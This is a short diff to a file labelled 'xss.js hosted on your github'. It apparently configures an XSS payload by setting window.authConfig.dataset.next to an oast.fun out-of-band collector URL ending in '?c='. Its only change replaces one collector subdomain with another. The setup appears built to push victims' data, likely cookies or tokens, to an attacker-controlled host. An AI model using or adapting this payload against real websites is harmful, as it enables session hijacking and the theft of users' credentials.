@@ -1,7 +1,7 @@
 // xss.js hosted on your github
 window.authConfig = {
     dataset: {
-        next: "https://ehexvgcthhdlxzxhgsvvnu3zjinpn36ty.oast.fun/?c=",
+        next: "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/?c=",
         append: "true"
     }
 };
